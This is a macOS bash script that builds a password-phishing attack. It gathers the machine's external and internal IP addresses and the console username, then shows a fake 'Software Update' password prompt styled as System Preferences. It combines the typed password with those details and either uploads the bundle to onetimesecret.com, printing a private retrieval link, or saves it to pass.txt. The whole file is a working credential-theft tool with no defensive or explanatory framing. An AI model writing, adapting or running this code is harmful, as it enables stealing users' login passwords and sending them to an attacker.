#!/usr/bin/env bash

externalip=$(curl -s http://ipecho.net/plain)
internalip=$(ifconfig en0 | grep inet | awk '$1=="inet" {print $2}')
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

#Runtime Default Values
promptcount=0
cflag=
oflag=
nflag=




read -r -d '' applescriptCode <<'EOF'
set msg1 to "Software Update is trying to authenticate user.

Enter the password for the user "
set username to long user name of (system info)
set msg2 to " to allow this."
set dialogText to text returned of (display dialog "" & msg1 & username & msg2 with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Preferences" default answer "" with hidden answer)
return dialogText
EOF

while getopts con: options
do
    case $options in
    c)    cflag=1;;
    o)    oflag=1;;
    n)    nflag=1
          nval="$OPTARG";;
    ?)   printf "Usage: %s: [-n value] args\n" $0
            exit 2;;
    esac
done

if [ ! -z "$nflag" ]; then
    promptcount=$(($nval - 1))
fi

for i in $( eval echo {0..$promptcount} )
do
dialogText=$(osascript -e "$applescriptCode");
capture=$(echo ExternalIP="$externalip" + InternalIP="$internalip" + username="$username"  + password="$dialogText");
done

if [ ! -z "$oflag" ]; then
metadata=$(curl -d 'secret='"$capture"'&ttl=3600' https://onetimesecret.com/api/v1/share | jq -r '.metadata_key')
printf "https://onetimesecret.com/private/$metadata\n"
else
    echo "$capture" >> pass.txt
fi

if [ ! -z "$cflag" ]; then
    rm pass.txt
fi